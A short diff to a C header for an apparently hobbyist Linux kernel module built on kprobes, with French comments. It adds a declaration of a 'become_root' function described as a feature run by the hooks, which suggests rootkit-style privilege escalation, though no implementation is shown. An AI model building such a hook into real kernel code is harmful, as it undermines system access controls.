@@ -6,7 +6,10 @@
 #include <linux/cred.h>
 #include <linux/sched.h>
 
-// Fonctions de test kprobes
+// Features exécutées par les hooks
+int become_root(void);
+
+// Fonctions d'appel des sondes kprobes
 int kprobes_init(void);
 void kprobes_exit(void);
 int kprobe_handler(struct kprobe *p, struct pt_regs *regs);
